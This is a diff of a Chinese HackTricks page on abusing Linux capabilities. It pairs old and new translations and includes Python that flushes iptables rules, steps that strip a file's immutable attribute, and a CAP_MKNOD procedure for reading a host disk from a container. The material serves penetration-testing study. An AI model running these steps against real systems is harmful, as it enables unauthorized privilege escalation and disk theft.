+请注意，如果**环境**提供了这个能力，您也可以使用 **`tcpdump`** 来嗅探流量。
 
-**二进制文件2的示例**
+**二进制示例 2**
 
-以下示例是**`python2`**代码，可用于拦截“**lo**”（**本地主机**）接口的流量。该代码来自实验“_The Basics: CAP-NET\_BIND + NET\_RAW_”（[https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)）。
+以下示例是可以用来拦截“**lo**”（**localhost**）接口流量的 **`python2`** 代码。该代码来自 [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) 上的实验室“基础知识：CAP-NET_BIND + NET_RAW”。
 ```python
 import socket
 import struct
@@ -1467,11 +1417,11 @@ count=count+1
 ```
 ## CAP\_NET\_ADMIN + CAP\_NET\_RAW
 
-[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许持有者在暴露的网络命名空间上**修改防火墙、路由表、套接字权限**、网络接口配置和其他相关设置。这还提供了在连接的网络接口上**启用混杂模式**并可能跨命名空间进行嗅探的能力。
+[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许持有者**修改暴露的网络命名空间的防火墙、路由表、套接字权限**，以及暴露的网络接口上的网络接口配置和其他相关设置。这还提供了为附加的网络接口**启用混杂模式**的能力，并有可能跨命名空间嗅探。
 
-**使用二进制文件的示例**
+**示例与二进制**
 
-假设**python二进制文件**具有这些能力。
+假设 **python 二进制文件** 具有这些能力。
 ```python
 #Dump iptables filter table rules
 import iptc
@@ -1483,13 +1433,13 @@ pprint.pprint(json)
 import iptc
 iptc.easy.flush_table('filter')
 ```
-## CAP_LINUX_IMMUTABLE
+## CAP\_LINUX\_IMMUTABLE
 
-**这意味着可以修改inode属性。**你不能直接利用这个能力来提升权限。
+**这意味着可以修改inode属性。** 你不能直接通过这个能力提升权限。
 
-**使用二进制文件的示例**
+**二进制示例**
 
-如果你发现一个文件是不可变的，并且python具有这个能力，你可以**移除不可变属性并使文件可修改：**
+如果你发现一个文件是不可变的，并且python具有这个能力，你可以**移除不可变属性，使文件可修改：**
 ```python
 #Check that the file is imutable
 lsattr file.sh
@@ -1513,7 +1463,7 @@ f=open("/path/to/file.sh",'a+')
 f.write('New content for the file\n')
 ```
 {% hint style="info" %}
-请注意，通常使用以下方式设置和移除此不可变属性：
+请注意，通常使用以下命令设置和删除此不可变属性：
 ```bash
 sudo chattr +i file.txt
 sudo chattr -i file.txt
@@ -1522,46 +1472,46 @@ sudo chattr -i file.txt
 
 ## CAP\_SYS\_CHROOT
 
-[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许使用 `chroot(2)` 系统调用。这可能允许通过已知的弱点和逃逸来逃离任何 `chroot(2)` 环境：
+[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许使用 `chroot(2)` 系统调用。这可能允许逃离任何 `chroot(2)` 环境，利用已知的弱点和逃逸方法：
 
 * [如何从各种 chroot 解决方案中逃脱](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
 * [chw00t: chroot 逃逸工具](https://github.com/earthquake/chw00t/)
 
 ## CAP\_SYS\_BOOT
 
-[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许使用 `reboot(2)` 系统调用。它还允许通过 `LINUX_REBOOT_CMD_RESTART2` 在某些特定硬件平台上执行任意的 **reboot 命令**。
+[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许使用 `reboot(2)` 系统调用。它还允许通过 `LINUX_REBOOT_CMD_RESTART2` 执行任意 **重启命令**，为一些特定硬件平台实现。
 
-此功能还允许使用 `kexec_load(2)` 系统调用，该调用加载一个新的崩溃内核，并且从 Linux 3.17 开始，还有 `kexec_file_load(2)`，它也会加载已签名的内核。
+这个能力还允许使用 `kexec_load(2)` 系统调用，它加载新的崩溃内核，以及从 Linux 3.17 开始的 `kexec_file_load(2)`，它还将加载签名内核。
 
 ## CAP\_SYSLOG
 
-[CAP\_SYSLOG](https://man7.org/linux/man-pages/man7/capabilities.7.html) 在 Linux 2.6.37 中最终从 `CAP_SYS_ADMIN` catchall 中分叉出来，此功能允许进程使用 `syslog(2)` 系统调用。当 `/proc/sys/kernel/kptr_restrict` 设置为 1 时，这也允许进程查看通过 `/proc` 和其他接口暴露的内核地址。
+[CAP\_SYSLOG](https://man7.org/linux/man-pages/man7/capabilities.7.html) 最终在 Linux 2.6.37 中从 `CAP_SYS_ADMIN` 通用能力中分离出来，这个能力允许进程使用 `syslog(2)` 系统调用。这也允许进程查看通过 `/proc` 和其他接口暴露的内核地址，当 `/proc/sys/kernel/kptr_restrict` 设置为 1 时。
 
-`kptr_restrict` sysctl 设置在 2.6.38 中引入，用于确定是否暴露内核地址。自 2.6.39 起，默认为零（暴露内核地址）在 vanilla 内核中，尽管许多发行版正确地将该值设置为 1（对除 uid 0 之外的所有人隐藏）或 2（始终隐藏）。
+`kptr_restrict` sysctl 设置在 2.6.38 中引入，用于确定是否暴露内核地址。自 2.6.39 起，默认值为零（暴露内核地址），尽管许多发行版正确地将值设置为 1（对所有人隐藏，除了 uid 0）或 2（始终隐藏）。
 
-此外，此功能还允许进程查看 `dmesg` 输出，如果 `dmesg_restrict` 设置为 1。最后，出于历史原因，仍然允许 `CAP_SYS_ADMIN` 功能执行 `syslog` 操作。
+此外，这个能力还允许进程查看 `dmesg` 输出，如果 `dmesg_restrict` 设置为 1。最后，出于历史原因，`CAP_SYS_ADMIN` 能力仍然被允许执行 `syslog` 操作。
 
 ## CAP\_MKNOD
 
-[CAP\_MKNOD](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许通过允许创建除了常规文件 (`S_IFREG`)、FIFO（命名管道）(`S_IFIFO`) 或 UNIX 域套接字 (`S_IFSOCK`) 之外的其他类型的文件来扩展使用 [mknod](https://man7.org/linux/man-pages/man2/mknod.2.html)。特殊文件类型包括：
+[CAP\_MKNOD](https://man7.org/linux/man-pages/man7/capabilities.7.html) 通过允许创建除了常规文件（`S_IFREG`）、FIFO（命名管道）（`S_IFIFO`）或 UNIX 域套接字（`S_IFSOCK`）之外的东西，扩展了 [mknod](https://man7.org/linux/man-pages/man2/mknod.2.html) 的使用。特殊文件包括：
 
-* `S_IFCHR`（字符特殊文件（类似终端的设备））
-* `S_IFBLK`（块特殊文件（类似磁盘的设备））。
+* `S_IFCHR`（字符特殊文件（像终端这样的设备））
+* `S_IFBLK`（块特殊文件（像磁盘这样的设备））。
 
-这是一个默认的功能 ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))。
+它是一个默认能力（[https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)）。
 
-此功能允许在以下条件下在主机上进行特权升级（通过完整磁盘读取）：
+这个能力允许在主机上进行权限提升（通过完整磁盘读取），在以下条件下：
 
-1. 初始访问主机（非特权用户）。
-2. 初始访问容器（特权用户（EUID 0）和有效 `CAP_MKNOD`）。
+1. 对主机有初始访问权限（非特权）。
+2. 对容器有初始访问权限（特权（EUID 0），并且有效的 `CAP_MKNOD`）。
 3. 主机和容器应共享相同的用户命名空间。
 
 **步骤：**
 
-1. 作为标准用户在主机上执行以下操作：
-   1. 获取当前 UID (`id`)。例如：`uid=1000(unprivileged)`。
-   2. 获取要读取的设备。例如：`/dev/sda`
-2. 作为 `root` 在容器中执行以下操作：
+1. 在主机上，作为标准用户：
+   1. 获取当前 UID（`id`）。例如：`uid=1000(unprivileged)`。
+   2. 获取你想要读取的设备。例如：`/dev/sda`
+2. 在容器中，作为 `root`：
 ```bash
 # Create a new block special file matching the host device
 mknod /dev/sda b
@@ -1572,7 +1522,7 @@ useradd -u 1000 unprivileged
 # Login with that user
 su unprivileged
 ```
-1. 回到主机：
+1. 回到主机上：
 ```bash
 # Find the PID linked to the container owns by the user "unprivileged"
 # Example only (Depends on the shell program, etc.). Here: PID=18802.
@@ -1584,49 +1534,49 @@ unprivileged        18802  0.0  0.0   1712     4 pts/0    S+   15:27   0:00 /bin
 # Because of user namespace sharing, the unprivileged user have access to the container filesystem, and so the created block special file pointing on /dev/sda
 head /proc/18802/root/dev/sda
 ```
-攻击者现在可以从非特权用户读取、转储、复制设备/dev/sda。
+攻击者现在可以从非特权用户读取、转储、复制设备 `/dev/sda`。
 
 ### CAP\_SETPCAP
 
-**`CAP_SETPCAP`** 是一种Linux能力，允许一个进程**修改另一个进程的能力集**。它授予了向其他进程的有效、可继承和允许的能力集中添加或删除能力的能力。然而，对于如何使用这种能力存在一定的限制。
+**`CAP_SETPCAP`** 是一个Linux能力，允许进程**修改另一个进程的能力集**。它授予从其他进程的有效、可继承和允许的能力集中添加或移除能力的能力。然而，对于如何使用这个能力有一定的限制。
 
-具有`CAP_SETPCAP`的进程**只能授予或删除其自身允许的能力集中的能力**。换句话说，如果一个进程本身没有某个能力，它就不能将该能力授予另一个进程。这个限制防止了一个进程将另一个进程的权限提升到自身权限之上。
+拥有 `CAP_SETPCAP` 的进程**只能授予或移除其自己允许能力集中的能力**。换句话说，如果一个进程本身没有某个能力，它就不能将该能力授予另一个进程。这个限制防止了一个进程将另一个进程的权限提升到超出其自身权限水平的情况。
 
-此外，在最近的内核版本中，`CAP_SETPCAP`能力已经**进一步受到限制**。它不再允许一个进程任意修改其他进程的能力集。相反，它**只允许一个进程降低其自身允许的能力集或其后代的允许的能力集**。这个改变是为了减少与能力相关的潜在安全风险。
+此外，在最近的内核版本中，`CAP_SETPCAP` 能力已经被**进一步限制**。它不再允许一个进程任意修改其他进程的能力集。相反，它**只允许一个进程降低其自己允许能力集或其后代的允许能力集中的能力**。这个变化是为了减少与该能力相关的潜在安全风险。
 
-要有效地使用`CAP_SETPCAP`，您需要在您的有效能力集中具有该能力，并在您的允许能力集中具有目标能力。然后，您可以使用`capset()`系统调用来修改其他进程的能力集。
+要有效使用 `CAP_SETPCAP`，你需要在你的有效能力集中拥有这个能力，并且在你的允许能力集中拥有目标能力。然后你可以使用 `capset()` 系统调用来修改其他进程的能力集。
 
-总之，`CAP_SETPCAP`允许一个进程修改其他进程的能力集，但它不能授予自身没有的能力。此外，由于安全问题，它在最近的内核版本中的功能已被限制为只允许降低其自身允许的能力集或其后代的允许的能力集。
+总结来说，`CAP_SETPCAP` 允许一个进程修改其他进程的能力集，但它不能授予自己没有的能力。此外，由于安全问题，其功能在最近的内核版本中已被限制，只允许减少其自己允许能力集或其后代的允许能力集中的能力。
 
 ## 参考资料
 
-**这些示例大部分来自** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com)，因此如果您想练习这些权限提升技术，我推荐这些实验室。
+**这些示例大多来自** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) **的一些实验室，所以如果你想练习这些权限提升技术，我推荐这些实验室。**
 
 **其他参考资料**：
 
 * [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
-* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
+* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
 * [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
 * [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
 * [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
 * [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)
 
-​
-
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-[**RootedCON**](https://www.rootedcon.com/) 是西班牙最重要的网络安全活动之一，也是欧洲最重要的网络安全活动之一。作为促进技术知识的使命，这个大会是技术和网络安全专业人士在各个领域的热点交流。
+[**RootedCON**](https://www.rootedcon.com/) 是**西班牙**最重要的网络安全活动，也是**欧洲**最重要的活动之一。以**推广技术知识**为使命，这个大会是技术和网络安全专业人士在各个学科的沸腾交汇点。
 
 {% embed url="https://www.rootedcon.com/" %}
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>从零开始学习AWS黑客攻击到高手，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* 您在一家**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**
+支持HackTricks的其他方式：
+
+* 如果你想在**HackTricks**上看到你的**公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享你的黑客技巧。
 
 </details>
